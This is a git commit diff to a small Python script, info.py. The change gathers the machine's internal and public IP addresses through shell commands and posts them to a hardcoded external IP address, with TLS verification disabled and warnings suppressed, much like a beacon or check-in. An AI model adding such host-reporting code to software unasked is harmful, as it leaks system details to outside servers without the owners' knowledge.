414b48b96c0a2c727bcf208822fcf3c1d23a1d8c
Ayobami Blackforce <ayobamiblackforce@gmail.com>
2026-02-24 12:24:49 -0500

    Update info.py to send IP data via POST request
    Modified the script to collect IP addresses and send them in a POST request.

--- info.py
+++ info.py
@@ -3,10 +3,10 @@ import subprocess
 from urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-
+url = 'https://142.93.36.242:8082/connections'
 a = subprocess.run(['hostname -i'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 b = subprocess.run(['curl ifconfig.me'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-a,b = a.stdout.decode(),b.stdout.decode()
-# url = 'https://142.93.36.242:8082/connections'
-# res = requests.post(url, headers={'Content-Type': 'application/json'}, data=json.dumps(data), verify=False)
-print(a,b)
+data = [a.stdout.decode(),b.stdout.decode(),'test','test','test','test','test','test']
+
+res = requests.post(url, headers={'Content-Type': 'application/json'}, data=json.dumps(data), verify=False)
+print(res.status_code)
